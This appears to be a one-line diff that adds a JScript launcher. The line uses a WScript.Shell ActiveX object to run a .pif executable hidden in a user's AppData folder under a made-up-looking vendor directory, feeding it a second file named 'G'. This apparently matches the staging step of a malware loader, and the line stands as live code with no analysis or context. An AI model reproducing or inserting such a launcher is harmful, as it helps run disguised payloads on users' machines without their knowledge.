@@ -1,0 +1,1 @@
+new ActiveXObject("Wscript.Shell").Run("\"C:\\Users\\Wanten\\AppData\\Local\\DesignInno Innovations\\GiraffeCraft.pif\" \"C:\\Users\\Wanten\\AppData\\Local\\DesignInno Innovations\\G\"")
